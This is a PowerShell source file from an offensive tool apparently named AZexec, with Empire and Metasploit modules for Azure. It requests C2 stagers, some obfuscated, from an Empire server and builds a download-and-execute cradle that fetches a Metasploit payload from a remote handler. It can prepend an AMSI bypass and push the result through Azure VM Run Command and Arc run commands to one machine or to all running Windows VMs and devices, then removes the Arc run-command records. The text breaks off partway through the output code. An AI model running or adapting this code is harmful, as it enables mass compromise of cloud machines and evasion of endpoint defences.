# AZexec - Shell Generation Functions (Empire and Metasploit Integration)
# Azure equivalent of NetExec's empire_exec and met_inject modules
# These functions generate C2 payloads and deploy them via Azure execution methods

# ============================================
# EMPIRE C2 INTEGRATION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Connect to Empire API and obtain authentication token.
.DESCRIPTION
    Authenticates to Empire's REST API and returns a JWT token for subsequent requests.
    This is equivalent to NetExec's empire_exec module authentication.
.PARAMETER Host
    Empire server hostname or IP address.
.PARAMETER Port
    Empire API port (default: 1337).
.PARAMETER Username
    Empire username for authentication.
.PARAMETER Password
    Empire password for authentication.
.PARAMETER SSL
    Use HTTPS for connection.
.OUTPUTS
    Returns JWT authentication token if successful, $null otherwise.
#>
function Connect-EmpireAPI {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Host,

        [int]$Port = 1337,

        [Parameter(Mandatory = $true)]
        [string]$Username,

        [Parameter(Mandatory = $true)]
        [string]$Password,

        [switch]$SSL
    )

    $protocol = if ($SSL) { "https" } else { "http" }
    $baseUrl = "${protocol}://${Host}:${Port}"

    Write-ColorOutput -Message "[*] Connecting to Empire API at $baseUrl" -Color "Yellow"

    try {
        # Disable certificate validation for self-signed certs (common in Empire deployments)
        if ($SSL) {
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        }

        $authBody = @{
            username = $Username
            password = $Password
        } | ConvertTo-Json

        $authHeaders = @{
            "Content-Type" = "application/json"
        }

        # POST to Empire v2 API auth endpoint
        $authUri = "$baseUrl/api/v2/auth/token"
        $response = Invoke-RestMethod -Method POST -Uri $authUri -Body $authBody -Headers $authHeaders -ErrorAction Stop

        if ($response.token) {
            Write-ColorOutput -Message "[+] Successfully authenticated to Empire API" -Color "Green"
            return $response.token
        } else {
            Write-ColorOutput -Message "[!] Authentication failed - no token received" -Color "Red"
            return $null
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to connect to Empire API: $($_.Exception.Message)" -Color "Red"

        # Provide helpful troubleshooting
        if ($_.Exception.Message -like "*Unable to connect*" -or $_.Exception.Message -like "*Connection refused*") {
            Write-ColorOutput -Message "[*] Ensure Empire server is running and accessible at $baseUrl" -Color "Yellow"
        } elseif ($_.Exception.Message -like "*401*" -or $_.Exception.Message -like "*Unauthorized*") {
            Write-ColorOutput -Message "[*] Check Empire credentials (username/password)" -Color "Yellow"
        } elseif ($_.Exception.Message -like "*certificate*") {
            Write-ColorOutput -Message "[*] SSL certificate error - ensure -SSL flag is correct" -Color "Yellow"
        }
        return $null
    }
}

<#
.SYNOPSIS
    Generate Empire stager/launcher from the API.
.DESCRIPTION
    Requests a PowerShell stager from Empire API for the specified listener.
    Returns the launcher string that can be executed on targets.
.PARAMETER Host
    Empire server hostname or IP address.
.PARAMETER Port
    Empire API port.
.PARAMETER Token
    JWT authentication token from Connect-EmpireAPI.
.PARAMETER Listener
    Name of the Empire listener to use for the stager.
.PARAMETER SSL
    Use HTTPS for API connection.
.PARAMETER Obfuscate
    Enable payload obfuscation.
.PARAMETER ObfuscateCommand
    Obfuscation command/options (default: "Token,All,1").
.OUTPUTS
    Returns PowerShell launcher string if successful, $null otherwise.
#>
function Get-EmpireStager {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Host,

        [int]$Port = 1337,

        [Parameter(Mandatory = $true)]
        [string]$Token,

        [Parameter(Mandatory = $true)]
        [string]$Listener,

        [switch]$SSL,

        [switch]$Obfuscate,

        [string]$ObfuscateCommand = "Token,All,1"
    )

    $protocol = if ($SSL) { "https" } else { "http" }
    $baseUrl = "${protocol}://${Host}:${Port}"

    Write-ColorOutput -Message "[*] Generating Empire stager for listener: $Listener" -Color "Yellow"

    try {
        # Disable certificate validation for self-signed certs
        if ($SSL) {
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
        }

        $headers = @{
            "Content-Type" = "application/json"
            "Authorization" = "Bearer $Token"
        }

        # Create stager request body
        $stagerBody = @{
            StagerName = "multi_launcher"
            Listener = $Listener
        }

        # Add obfuscation if requested
        if ($Obfuscate) {
            $stagerBody.Obfuscate = $true
            $stagerBody.ObfuscateCommand = $ObfuscateCommand
            Write-ColorOutput -Message "[*] Obfuscation enabled: $ObfuscateCommand" -Color "Cyan"
        }

        $stagerJson = $stagerBody | ConvertTo-Json

        # POST to stagers endpoint
        $stagerUri = "$baseUrl/api/v2/stagers"
        $response = Invoke-RestMethod -Method POST -Uri $stagerUri -Body $stagerJson -Headers $headers -ErrorAction Stop

        if ($response.Output) {
            Write-ColorOutput -Message "[+] Stager generated successfully" -Color "Green"
            return $response.Output
        } elseif ($response.launcher) {
            Write-ColorOutput -Message "[+] Launcher generated successfully" -Color "Green"
            return $response.launcher
        } else {
            Write-ColorOutput -Message "[!] Stager generation failed - no output received" -Color "Red"
            return $null
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to generate Empire stager: $($_.Exception.Message)" -Color "Red"

        if ($_.Exception.Message -like "*404*") {
            Write-ColorOutput -Message "[*] Listener '$Listener' may not exist - check Empire listeners" -Color "Yellow"
        } elseif ($_.Exception.Message -like "*401*" -or $_.Exception.Message -like "*403*") {
            Write-ColorOutput -Message "[*] Token may have expired - re-authenticate with Connect-EmpireAPI" -Color "Yellow"
        }
        return $null
    }
}

# ============================================
# METASPLOIT INTEGRATION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Generate a Metasploit PowerShell download cradle.
.DESCRIPTION
    Creates a PowerShell one-liner that downloads and executes a Metasploit payload.
    This is equivalent to NetExec's met_inject module cradle generation.
.PARAMETER SRVHOST
    Metasploit handler host (IP or hostname).
.PARAMETER SRVPORT
    Metasploit handler port.
.PARAMETER RAND
    Random URI path for the payload download.
.PARAMETER SSL
    Use HTTPS for payload download.
.PARAMETER ProxyHost
    Optional proxy host for environments requiring proxy.
.PARAMETER ProxyPort
    Optional proxy port.
.OUTPUTS
    Returns PowerShell download cradle string.
#>
function New-MetasploitCradle {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SRVHOST,

        [Parameter(Mandatory = $true)]
        [int]$SRVPORT,

        [Parameter(Mandatory = $true)]
        [string]$RAND,

        [switch]$SSL,

        [string]$ProxyHost,

        [int]$ProxyPort
    )

    $protocol = if ($SSL) { "https" } else { "http" }
    $payloadUrl = "${protocol}://${SRVHOST}:${SRVPORT}/${RAND}"

    Write-ColorOutput -Message "[*] Generating Metasploit download cradle" -Color "Yellow"
    Write-ColorOutput -Message "[*] Payload URL: $payloadUrl" -Color "Cyan"

    # Build the cradle - matches NetExec's met_inject implementation
    $cradle = @"
`$ProgressPreference = 'SilentlyContinue'
"@

    # Add SSL certificate bypass for self-signed certs
    if ($SSL) {
        $cradle += @"

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
"@
    }

    # Add proxy configuration if specified
    if ($ProxyHost) {
        Write-ColorOutput -Message "[*] Proxy configured: ${ProxyHost}:${ProxyPort}" -Color "Cyan"
        $cradle += @"

`$proxy = New-Object System.Net.WebProxy("http://${ProxyHost}:${ProxyPort}", `$true)
`$wc = New-Object System.Net.WebClient
`$wc.Proxy = `$proxy
`$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
"@
    } else {
        $cradle += @"

`$wc = New-Object System.Net.WebClient
`$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
`$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
"@
    }

    # Add the download and execute
    $cradle += @"

IEX `$wc.DownloadString('$payloadUrl')
"@

    Write-ColorOutput -Message "[+] Cradle generated successfully" -Color "Green"
    return $cradle
}

# ============================================
# MAIN EXECUTION FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Execute Empire stager on Azure targets.
.DESCRIPTION
    Azure equivalent of NetExec's empire_exec module.
    Generates an Empire stager and deploys it via Azure execution methods.
.PARAMETER Listener
    Name of the Empire listener to use.
.PARAMETER EmpireHost
    Empire server hostname or IP.
.PARAMETER EmpirePort
    Empire API port (default: 1337).
.PARAMETER EmpireUsername
    Empire API username.
.PARAMETER EmpirePassword
    Empire API password.
.PARAMETER SSL
    Use HTTPS for Empire API connection.
.PARAMETER Obfuscate
    Enable stager obfuscation.
.PARAMETER ObfuscateCommand
    Obfuscation options.
.PARAMETER EmpireConfigFile
    Path to Empire config file (JSON with host, port, username, password).
.PARAMETER VMName
    Target VM name for single-target execution.
.PARAMETER AllVMs
    Execute on all matching VMs.
.PARAMETER DeviceName
    Target Arc-enabled device name.
.PARAMETER AllDevices
    Execute on all Arc-enabled devices.
.PARAMETER ResourceGroup
    Resource group filter.
.PARAMETER SubscriptionId
    Subscription ID filter.
.PARAMETER ExecMethod
    Execution method: auto, vmrun, arc, mde, intune, automation.
.PARAMETER Timeout
    Execution timeout in seconds.
.PARAMETER AmsiBypass
    Path to AMSI bypass script to prepend.
.PARAMETER ExportPath
    Path to export results.
#>
function Invoke-EmpireExecution {
    param(
        # Empire options
        [Parameter(Mandatory = $true)]
        [string]$Listener,

        [string]$EmpireHost,

        [int]$EmpirePort = 1337,

        [string]$EmpireUsername,

        [string]$EmpirePassword,

        [switch]$SSL,

        [switch]$Obfuscate,

        [string]$ObfuscateCommand = "Token,All,1",

        [string]$EmpireConfigFile,

        # Target parameters
        [string]$VMName,

        [switch]$AllVMs,

        [string]$DeviceName,

        [switch]$AllDevices,

        [string]$ResourceGroup,

        [string]$SubscriptionId,

        [ValidateSet("auto", "vmrun", "arc", "mde", "intune", "automation")]
        [string]$ExecMethod = "auto",

        [int]$Timeout = 300,

        [string]$AmsiBypass,

        [string]$ExportPath
    )

    # ============================================
    # BANNER AND INTRO
    # ============================================
    Write-ColorOutput -Message "`n[*] AZX - Empire Execution" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: empire-exec (Azure equivalent of nxc -M empire_exec)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Deploy Empire stager via Azure execution methods`n" -Color "Cyan"

    # ============================================
    # LOAD EMPIRE CONFIGURATION
    # ============================================
    if ($EmpireConfigFile) {
        if (Test-Path $EmpireConfigFile) {
            Write-ColorOutput -Message "[*] Loading Empire configuration from: $EmpireConfigFile" -Color "Yellow"
            try {
                $config = Get-Content $EmpireConfigFile -Raw | ConvertFrom-Json
                if (-not $EmpireHost -and $config.host) { $EmpireHost = $config.host }
                if ($EmpirePort -eq 1337 -and $config.port) { $EmpirePort = $config.port }
                if (-not $EmpireUsername -and $config.username) { $EmpireUsername = $config.username }
                if (-not $EmpirePassword -and $config.password) { $EmpirePassword = $config.password }
                if (-not $SSL -and $config.ssl) { $SSL = $config.ssl }
                Write-ColorOutput -Message "[+] Configuration loaded successfully" -Color "Green"
            } catch {
                Write-ColorOutput -Message "[!] Failed to parse config file: $($_.Exception.Message)" -Color "Red"
                return
            }
        } else {
            Write-ColorOutput -Message "[!] Config file not found: $EmpireConfigFile" -Color "Red"
            return
        }
    }

    # Validate required parameters
    if (-not $EmpireHost) {
        Write-ColorOutput -Message "[!] Error: -EmpireHost is required" -Color "Red"
        Write-ColorOutput -Message "[*] Usage: -EmpireHost <hostname> -EmpireUsername <user> -EmpirePassword <pass>" -Color "Yellow"
        Write-ColorOutput -Message "[*] Or use: -EmpireConfigFile <path> with JSON config" -Color "Yellow"
        return
    }
    if (-not $EmpireUsername -or -not $EmpirePassword) {
        Write-ColorOutput -Message "[!] Error: -EmpireUsername and -EmpirePassword are required" -Color "Red"
        return
    }

    # Validate target
    if (-not $VMName -and -not $AllVMs -and -not $DeviceName -and -not $AllDevices) {
        Write-ColorOutput -Message "[!] Error: Must specify target" -Color "Red"
        Write-ColorOutput -Message "[*] VM targeting: -VMName or -AllVMs" -Color "Yellow"
        Write-ColorOutput -Message "[*] Device targeting: -DeviceName or -AllDevices" -Color "Yellow"
        return
    }

    # ============================================
    # CONNECT TO EMPIRE AND GENERATE STAGER
    # ============================================
    Write-ColorOutput -Message "[*] Empire Configuration:" -Color "Cyan"
    Write-ColorOutput -Message "    Host: $EmpireHost" -Color "Gray"
    Write-ColorOutput -Message "    Port: $EmpirePort" -Color "Gray"
    Write-ColorOutput -Message "    SSL: $SSL" -Color "Gray"
    Write-ColorOutput -Message "    Listener: $Listener" -Color "Gray"
    Write-ColorOutput -Message "    Obfuscate: $Obfuscate" -Color "Gray"
    Write-Host ""

    # Authenticate to Empire
    $empireToken = Connect-EmpireAPI -Host $EmpireHost -Port $EmpirePort `
        -Username $EmpireUsername -Password $EmpirePassword -SSL:$SSL

    if (-not $empireToken) {
        Write-ColorOutput -Message "[!] Failed to authenticate to Empire - aborting" -Color "Red"
        return
    }

    # Generate stager
    $stager = Get-EmpireStager -Host $EmpireHost -Port $EmpirePort -Token $empireToken `
        -Listener $Listener -SSL:$SSL -Obfuscate:$Obfuscate -ObfuscateCommand $ObfuscateCommand

    if (-not $stager) {
        Write-ColorOutput -Message "[!] Failed to generate Empire stager - aborting" -Color "Red"
        return
    }

    Write-ColorOutput -Message "[*] Stager preview (first 100 chars):" -Color "Cyan"
    $preview = if ($stager.Length -gt 100) { $stager.Substring(0, 100) + "..." } else { $stager }
    Write-ColorOutput -Message "    $preview" -Color "Gray"
    Write-Host ""

    # ============================================
    # INITIALIZE AZURE RM AND EXECUTE
    # ============================================
    $requiredModules = @('Az.Accounts', 'Az.Compute', 'Az.Resources')
    if ($ExecMethod -eq "arc" -or $ExecMethod -eq "auto") {
        $requiredModules += 'Az.ConnectedMachine'
    }

    if (-not (Initialize-AzureRMModules -RequiredModules $requiredModules)) {
        return
    }

    $azContext = Connect-AzureRM
    if (-not $azContext) { return }

    $subscriptionsToScan = Get-SubscriptionsToEnumerate -SubscriptionId $SubscriptionId -CurrentContext $azContext
    if (-not $subscriptionsToScan) { return }

    # ============================================
    # EXECUTE ON TARGETS
    # ============================================
    $exportData = @()
    $totalTargets = 0
    $successfulExec = 0
    $failedExec = 0

    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] EMPIRE STAGER DEPLOYMENT" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    foreach ($subscription in $subscriptionsToScan) {
        if (-not (Set-SubscriptionContext -Subscription $subscription)) {
            continue
        }

        $targets = @()

        # Get targets based on parameters
        if ($DeviceName -or $AllDevices) {
            # Arc-enabled devices
            try {
                if (Get-Module -ListAvailable -Name Az.ConnectedMachine) {
                    Import-Module Az.ConnectedMachine -ErrorAction SilentlyContinue
                    $arcMachines = @()
                    if ($ResourceGroup) {
                        $arcMachines = @(Get-AzConnectedMachine -ResourceGroupName $ResourceGroup -ErrorAction Stop)
                    } else {
                        $arcMachines = @(Get-AzConnectedMachine -ErrorAction Stop)
                    }

                    if ($DeviceName) {
                        $arcMachines = @($arcMachines | Where-Object { $_.Name -eq $DeviceName })
                    }
                    $arcMachines = @($arcMachines | Where-Object { $_.Status -eq "Connected" })

                    foreach ($arc in $arcMachines) {
                        $targets += [PSCustomObject]@{
                            Name = $arc.Name
                            ResourceGroup = $arc.ResourceGroupName
                            Type = "ArcDevice"
                            OSType = [string]$arc.OsType
                            PowerState = $arc.Status
                            Location = $arc.Location
                            Method = "arc"
                            Subscription = $subscription.Name
                            SubscriptionId = $subscription.Id
                        }
                    }
                }
            } catch {
                Write-ColorOutput -Message "[!] Error retrieving Arc devices: $($_.Exception.Message)" -Color "Yellow"
            }
        } else {
            # Azure VMs
            try {
                $vms = @()
                if ($ResourceGroup) {
                    $vms = @(Get-AzVM -ResourceGroupName $ResourceGroup -Status -ErrorAction Stop)
                } else {
                    $vms = @(Get-AzVM -Status -ErrorAction Stop)
                }

                if ($VMName) {
                    $vms = @($vms | Where-Object { $_.Name -eq $VMName })
                }
                # Filter to Windows VMs only for Empire (PowerShell-based)
                $vms = @($vms | Where-Object { $_.PowerState -eq "VM running" -and $_.StorageProfile.OsDisk.OsType -eq "Windows" })

                foreach ($vm in $vms) {
                    $targets += [PSCustomObject]@{
                        Name = $vm.Name
                        ResourceGroup = $vm.ResourceGroupName
                        Type = "AzureVM"
                        OSType = [string]$vm.StorageProfile.OsDisk.OsType
                        PowerState = $vm.PowerState
                        Location = $vm.Location
                        Method = "vmrun"
                        Subscription = $subscription.Name
                        SubscriptionId = $subscription.Id
                    }
                }
            } catch {
                Write-ColorOutput -Message "[!] Error retrieving VMs: $($_.Exception.Message)" -Color "Yellow"
            }
        }

        if ($targets.Count -eq 0) {
            continue
        }

        $totalTargets += $targets.Count

        foreach ($target in $targets) {
            $targetName = $target.Name
            $targetRG = $target.ResourceGroup
            $targetOS = $target.OSType
            $targetMethod = if ($ExecMethod -eq "auto") { $target.Method } else { $ExecMethod }

            Write-ColorOutput -Message "`n[*] Target: $targetName" -Color "White"
            Write-ColorOutput -Message "    Resource Group: $targetRG" -Color "Gray"
            Write-ColorOutput -Message "    OS: $targetOS | Method: $targetMethod" -Color "Gray"

            # Prepare command with optional AMSI bypass
            $commandToExecute = $stager
            if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
                Write-ColorOutput -Message "    [*] Prepending AMSI bypass from: $AmsiBypass" -Color "Yellow"
                $bypassContent = Get-Content -Path $AmsiBypass -Raw
                $commandToExecute = $bypassContent + "`n" + $stager
            }

            try {
                $result = $null
                $startTime = Get-Date

                if ($targetMethod -eq "vmrun") {
                    $result = Invoke-AzVMRunCommand `
                        -ResourceGroupName $targetRG `
                        -VMName $targetName `
                        -CommandId "RunPowerShellScript" `
                        -ScriptString $commandToExecute `
                        -ErrorAction Stop

                } elseif ($targetMethod -eq "arc") {
                    $runCommandName = "azx-empire-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
                    $arcResult = Invoke-AzConnectedMachineRunCommand `
                        -ResourceGroupName $targetRG `
                        -MachineName $targetName `
                        -Location $target.Location `
                        -RunCommandName $runCommandName `
                        -SourceScript $commandToExecute `
                        -ErrorAction Stop

                    # Cleanup
                    Remove-AzConnectedMachineRunCommand `
                        -ResourceGroupName $targetRG `
                        -MachineName $targetName `
                        -RunCommandName $runCommandName `
                        -ErrorAction SilentlyContinue
                }

                $duration = ((Get-Date) - $startTime).TotalSeconds

                # NetExec-style output
                Write-Host ""
                Write-Host "AZR".PadRight(8) -ForegroundColor "Magenta" -NoNewline
                Write-Host $targetName.Substring(0, [Math]::Min(20, $targetName.Length)).PadRight(22) -NoNewline
                Write-Host "443".PadRight(7) -NoNewline
                Write-Host $targetOS.PadRight(12) -NoNewline
                Write-Host "(Empire!)".PadRight(12) -ForegroundColor "Green" -NoNewline
                Write-Host "$Listener listener deployed" -ForegroundColor "White"

                Write-ColorOutput -Message "    [+] Stager deployed in $([Math]::Round($duration, 2))s" -Color "Green"
                $successfulExec++

                $exportData += [PSCustomObject]@{
                    Subscription = $target.Subscription
                    TargetName = $targetName
                    ResourceGroup = $targetRG
                    OSType = $targetOS
                    Method = $targetMethod
                    Listener = $Listener
                    Status = "Success"
                    Duration = $duration
                    Timestamp = $startTime.ToString("yyyy-MM-dd HH:mm:ss")
                }

            } catch {
                Write-Host ""
                Write-Host "AZR".PadRight(8) -ForegroundColor "Magenta" -NoNewline
                Write-Host $targetName.Substring(0, [Math]::Min(20, $targetName.Length)).PadRight(22) -NoNewline
                Write-Host "443".PadRight(7) -NoNewline
                Write-Host $targetOS.PadRight(12) -NoNewline
                Write-Host "(Failed!)".PadRight(12) -ForegroundColor "Red" -NoNewline
                Write-Host "" -ForegroundColor "White"

                Write-ColorOutput -Message "    [!] Execution failed: $($_.Exception.Message)" -Color "Red"
                $failedExec++

                $exportData += [PSCustomObject]@{
                    Subscription = $target.Subscription
                    TargetName = $targetName
                    ResourceGroup = $targetRG
                    OSType = $targetOS
                    Method = $targetMethod
                    Listener = $Listener
                    Status = "Failed"
                    Error = $_.Exception.Message
                    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                }
            }
        }
    }

    # ============================================
    # SUMMARY
    # ============================================
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] EMPIRE EXECUTION SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    Write-ColorOutput -Message "[*] Listener: $Listener" -Color "White"
    Write-ColorOutput -Message "[*] Total Targets: $totalTargets" -Color "White"
    Write-ColorOutput -Message "[*] Successful: $successfulExec" -Color "Green"
    Write-ColorOutput -Message "[*] Failed: $failedExec" -Color $(if ($failedExec -gt 0) { "Red" } else { "Green" })

    Write-ColorOutput -Message "`n[*] NETEXEC COMPARISON:" -Color "Yellow"
    Write-ColorOutput -Message "    NetExec: nxc smb <target> -M empire_exec -o LISTENER=$Listener" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 empire-exec -Listener $Listener -EmpireHost <host> -VMName <vm>" -Color "Gray"

    # Export results
    if ($ExportPath -and $exportData.Count -gt 0) {
        $stats = @{
            "Total Targets" = $totalTargets
            "Successful" = $successfulExec
            "Failed" = $failedExec
            "Listener" = $Listener
        }
        Export-EnumerationResults -Data $exportData -ExportPath $ExportPath -Title "Empire Execution Results" -Statistics $stats -CommandName "empire-exec" -Description "Azure Empire stager deployment results. Equivalent to NetExec -M empire_exec."
    }

    return $exportData
}

<#
.SYNOPSIS
    Inject Metasploit payload on Azure targets.
.DESCRIPTION
    Azure equivalent of NetExec's met_inject module.
    Generates a Metasploit download cradle and deploys it via Azure execution methods.
.PARAMETER SRVHOST
    Metasploit handler host.
.PARAMETER SRVPORT
    Metasploit handler port.
.PARAMETER RAND
    Random URI path for payload.
.PARAMETER SSL
    Use HTTPS for payload download.
.PARAMETER ProxyHost
    Optional proxy host.
.PARAMETER ProxyPort
    Optional proxy port.
.PARAMETER VMName
    Target VM name for single-target execution.
.PARAMETER AllVMs
    Execute on all matching VMs.
.PARAMETER DeviceName
    Target Arc-enabled device name.
.PARAMETER AllDevices
    Execute on all Arc-enabled devices.
.PARAMETER ResourceGroup
    Resource group filter.
.PARAMETER SubscriptionId
    Subscription ID filter.
.PARAMETER ExecMethod
    Execution method: auto, vmrun, arc, mde, intune, automation.
.PARAMETER Timeout
    Execution timeout in seconds.
.PARAMETER AmsiBypass
    Path to AMSI bypass script to prepend.
.PARAMETER ExportPath
    Path to export results.
#>
function Invoke-MetasploitInjection {
    param(
        # Metasploit options
        [Parameter(Mandatory = $true)]
        [string]$SRVHOST,

        [Parameter(Mandatory = $true)]
        [int]$SRVPORT,

        [Parameter(Mandatory = $true)]
        [string]$RAND,

        [switch]$SSL,

        [string]$ProxyHost,

        [int]$ProxyPort,

        # Target parameters
        [string]$VMName,

        [switch]$AllVMs,

        [string]$DeviceName,

        [switch]$AllDevices,

        [string]$ResourceGroup,

        [string]$SubscriptionId,

        [ValidateSet("auto", "vmrun", "arc", "mde", "intune", "automation")]
        [string]$ExecMethod = "auto",

        [int]$Timeout = 300,

        [string]$AmsiBypass,

        [string]$ExportPath
    )

    # ============================================
    # BANNER AND INTRO
    # ============================================
    Write-ColorOutput -Message "`n[*] AZX - Metasploit Injection" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: met-inject (Azure equivalent of nxc -M met_inject)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Deploy Metasploit payload via Azure execution methods`n" -Color "Cyan"

    # Validate target
    if (-not $VMName -and -not $AllVMs -and -not $DeviceName -and -not $AllDevices) {
        Write-ColorOutput -Message "[!] Error: Must specify target" -Color "Red"
        Write-ColorOutput -Message "[*] VM targeting: -VMName or -AllVMs" -Color "Yellow"
        Write-ColorOutput -Message "[*] Device targeting: -DeviceName or -AllDevices" -Color "Yellow"
        return
    }

    # ============================================
    # GENERATE METASPLOIT CRADLE
    # ============================================
    Write-ColorOutput -Message "[*] Metasploit Configuration:" -Color "Cyan"
    Write-ColorOutput -Message "    SRVHOST: $SRVHOST" -Color "Gray"
    Write-ColorOutput -Message "    SRVPORT: $SRVPORT" -Color "Gray"
    Write-ColorOutput -Message "    RAND: $RAND" -Color "Gray"
    Write-ColorOutput -Message "    SSL: $SSL" -Color "Gray"
    if ($ProxyHost) {
        Write-ColorOutput -Message "    Proxy: ${ProxyHost}:${ProxyPort}" -Color "Gray"
    }
    Write-Host ""

    $cradle = New-MetasploitCradle -SRVHOST $SRVHOST -SRVPORT $SRVPORT -RAND $RAND `
        -SSL:$SSL -ProxyHost $ProxyHost -ProxyPort $ProxyPort

    if (-not $cradle) {
        Write-ColorOutput -Message "[!] Failed to generate Metasploit cradle - aborting" -Color "Red"
        return
    }

    # ============================================
    # INITIALIZE AZURE RM AND EXECUTE
    # ============================================
    $requiredModules = @('Az.Accounts', 'Az.Compute', 'Az.Resources')
    if ($ExecMethod -eq "arc" -or $ExecMethod -eq "auto") {
        $requiredModules += 'Az.ConnectedMachine'
    }

    if (-not (Initialize-AzureRMModules -RequiredModules $requiredModules)) {
        return
    }

    $azContext = Connect-AzureRM
    if (-not $azContext) { return }

    $subscriptionsToScan = Get-SubscriptionsToEnumerate -SubscriptionId $SubscriptionId -CurrentContext $azContext
    if (-not $subscriptionsToScan) { return }

    # ============================================
    # EXECUTE ON TARGETS
    # ============================================
    $exportData = @()
    $totalTargets = 0
    $successfulExec = 0
    $failedExec = 0

    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] METASPLOIT PAYLOAD DEPLOYMENT" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    foreach ($subscription in $subscriptionsToScan) {
        if (-not (Set-SubscriptionContext -Subscription $subscription)) {
            continue
        }

        $targets = @()

        # Get targets based on parameters
        if ($DeviceName -or $AllDevices) {
            # Arc-enabled devices
            try {
                if (Get-Module -ListAvailable -Name Az.ConnectedMachine) {
                    Import-Module Az.ConnectedMachine -ErrorAction SilentlyContinue
                    $arcMachines = @()
                    if ($ResourceGroup) {
                        $arcMachines = @(Get-AzConnectedMachine -ResourceGroupName $ResourceGroup -ErrorAction Stop)
                    } else {
                        $arcMachines = @(Get-AzConnectedMachine -ErrorAction Stop)
                    }

                    if ($DeviceName) {
                        $arcMachines = @($arcMachines | Where-Object { $_.Name -eq $DeviceName })
                    }
                    $arcMachines = @($arcMachines | Where-Object { $_.Status -eq "Connected" })

                    foreach ($arc in $arcMachines) {
                        $targets += [PSCustomObject]@{
                            Name = $arc.Name
                            ResourceGroup = $arc.ResourceGroupName
                            Type = "ArcDevice"
                            OSType = [string]$arc.OsType
                            PowerState = $arc.Status
                            Location = $arc.Location
                            Method = "arc"
                            Subscription = $subscription.Name
                            SubscriptionId = $subscription.Id
                        }
                    }
                }
            } catch {
                Write-ColorOutput -Message "[!] Error retrieving Arc devices: $($_.Exception.Message)" -Color "Yellow"
            }
        } else {
            # Azure VMs
            try {
                $vms = @()
                if ($ResourceGroup) {
                    $vms = @(Get-AzVM -ResourceGroupName $ResourceGroup -Status -ErrorAction Stop)
                } else {
                    $vms = @(Get-AzVM -Status -ErrorAction Stop)
                }

                if ($VMName) {
                    $vms = @($vms | Where-Object { $_.Name -eq $VMName })
                }
                # Filter to Windows VMs only for Metasploit PowerShell payload
                $vms = @($vms | Where-Object { $_.PowerState -eq "VM running" -and $_.StorageProfile.OsDisk.OsType -eq "Windows" })

                foreach ($vm in $vms) {
                    $targets += [PSCustomObject]@{
                        Name = $vm.Name
                        ResourceGroup = $vm.ResourceGroupName
                        Type = "AzureVM"
                        OSType = [string]$vm.StorageProfile.OsDisk.OsType
                        PowerState = $vm.PowerState
                        Location = $vm.Location
                        Method = "vmrun"
                        Subscription = $subscription.Name
                        SubscriptionId = $subscription.Id
                    }
                }
            } catch {
                Write-ColorOutput -Message "[!] Error retrieving VMs: $($_.Exception.Message)" -Color "Yellow"
            }
        }

        if ($targets.Count -eq 0) {
            continue
        }

        $totalTargets += $targets.Count

        foreach ($target in $targets) {
            $targetName = $target.Name
            $targetRG = $target.ResourceGroup
            $targetOS = $target.OSType
            $targetMethod = if ($ExecMethod -eq "auto") { $target.Method } else { $ExecMethod }

            Write-ColorOutput -Message "`n[*] Target: $targetName" -Color "White"
            Write-ColorOutput -Message "    Resource Group: $targetRG" -Color "Gray"
            Write-ColorOutput -Message "    OS: $targetOS | Method: $targetMethod" -Color "Gray"

            # Prepare command with optional AMSI bypass
            $commandToExecute = $cradle
            if ($AmsiBypass -and (Test-Path $AmsiBypass)) {
                Write-ColorOutput -Message "    [*] Prepending AMSI bypass from: $AmsiBypass" -Color "Yellow"
                $bypassContent = Get-Content -Path $AmsiBypass -Raw
                $commandToExecute = $bypassContent + "`n" + $cradle
            }

            try {
                $result = $null
                $startTime = Get-Date

                if ($targetMethod -eq "vmrun") {
                    $result = Invoke-AzVMRunCommand `
                        -ResourceGroupName $targetRG `
                        -VMName $targetName `
                        -CommandId "RunPowerShellScript" `
                        -ScriptString $commandToExecute `
                        -ErrorAction Stop

                } elseif ($targetMethod -eq "arc") {
                    $runCommandName = "azx-metasploit-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
                    $arcResult = Invoke-AzConnectedMachineRunCommand `
                        -ResourceGroupName $targetRG `
                        -MachineName $targetName `
                        -Location $target.Location `
                        -RunCommandName $runCommandName `
                        -SourceScript $commandToExecute `
                        -ErrorAction Stop

                    # Cleanup
                    Remove-AzConnectedMachineRunCommand `
                        -ResourceGroupName $targetRG `
                        -MachineName $targetName `
                        -RunCommandName $runCommandName `
                        -ErrorAction SilentlyContinue
                }

                $duration = ((Get-Date) - $startTime).TotalSeconds

                # NetExec-style output
                Write-Host ""
                Write-Host "AZR".PadRight(8) -ForegroundColor "Magenta" -NoNewline
                Write-Host $targetName.Substring(0, [Math]::Min(20, $targetName.Length)).PadRight(22) -NoNewline
                Write-Host "443".PadRight(7) -NoNewline
